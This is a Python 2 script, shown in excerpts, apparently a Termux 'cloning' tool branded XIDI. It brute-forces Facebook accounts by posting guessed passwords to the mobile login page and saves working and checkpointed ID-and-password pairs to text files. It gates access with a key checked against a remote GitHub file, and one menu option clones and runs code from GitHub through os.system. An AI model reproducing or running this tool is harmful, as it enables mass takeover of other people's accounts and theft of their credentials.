...
logo = "' \x1b[1;97m __  _____ ____ ___  \x1b[1;97m \ \/ /_ _|  _ \_ _| \x1b[1;97m  \  / | || | | | |  \x1b[1;97m  /  \ | || |_| | |  \x1b[1;97m /_/\_\___|____/___|                    "
...
def main_apv():
    ...
    try:
        ...
        print '           So Contact me on Facebook Thanks'
        ...
        raw_input('   After that Restart your termux')
        os.system('xdg-open https://www.facebook.com/profile.php?id=100010399241489')

    r1 = requests.get('https://raw.githubusercontent.com/ALI-XP/XP/main/XIDI.txt').text
    if key1 in r1:
        main_system()
    else:
        os.system('clear')
        ...
        print '          YOUR KEY : ' + key1
        print '           Copy and send me on Facebook'
        raw_input('   Press enter for contact me ')
        os.system('xdg-open https://www.facebook.com/profile.php?id=100010399241489')
...
def main_system():
    ...
    try:
        ...
        print '\x1b[1;97mToken on Chekpiont '
        os.system('rm -rf token.txt')
    ...
    print ''
    print 39 * '~'
    print '\x1b[1;97m[1]   Public Cloning      \x1b[1;97m(Login)'
    print '\x1b[1;97m[2]   Random Cloning     \x1b[1;97m (No Login)'
    print '\x1b[1;97m[3]   File Cloning       \x1b[1;97m (No Login)'
    print '\x1b[1;97m[4]   File Making Menu\x1b[1;97m    (Login)'
    print '\x1b[1;97m[5]   Check Subscription '
    print '\x1b[1;97m[6]   Update Tools'
    print '\x1b[1;97m[7]   For Any Help Massage me on Facebook'
    print 43 * '~'
    print '\x1b[1;92m[*]\x1b[1;97m For Need Any Help Type 7 And \x1b[1;97mMessage me on Facebook  '
    print 43 * '~'
    main_input()


def main_input():
    mx = raw_input('\x1b[1;97m[*] Select :\x1b[1;97m ')
    if mx == '1':
        print ''
        ...
        os.system('git clone https://github.com/ALI-XP/XP')
        os.system('cp -f XP/XP \\.')
        os.system('rm -rf XP')
        os.system(' cd XP')
        os.system(' python2 XP.py')
        time.sleep(5)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[XIDI-OK] ' + coc + user + ' | ' + pass1
                ok = open('XIDI random-ok.txt', 'a')
                ok.write(cid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(cid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;97m[XIDI-CP] ' + coc + user + ' | ' + pass1
                cp = open('XIDI random-cp.txt', 'a')
                cp.write(cid + ' | ' + pass1 + '\n')
                cp.close()
...
def n_p_pass():
    ...
    os.system('echo " -----------------------------------"| lolcat')
    print '        Cracking Start Please Wait .. '
    print ' if idz not coming then use the (Airplane) Flight Mod'
    os.system('echo " -----------------------------------"| lolcat')
...
def grap():
    ...
    try:
        ...
        print '\x1b[1;97m  [ Maximum Limit 10 IDs ]'
        print ''
        c = raw_input('\x1b[1;92m[*] How Many Links Do You Want To Dump : ')
        if c == '1':
            ext1()
        elif c == '2':
            ext2()
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                b = rana.post('https://mbasic.facebook.com/login.php', data = {
                                    ...
                                    'login': 'submit' })
                                if 'c_user' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;92m[XIDI-OK] ' + uid + ' | ' + pass6
                                    ok = open('XIDI-ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'checkpoint' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;97m[XIDI-CP] ' + uid + ' | ' + pass6
                                    cp = open('XIDI-cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
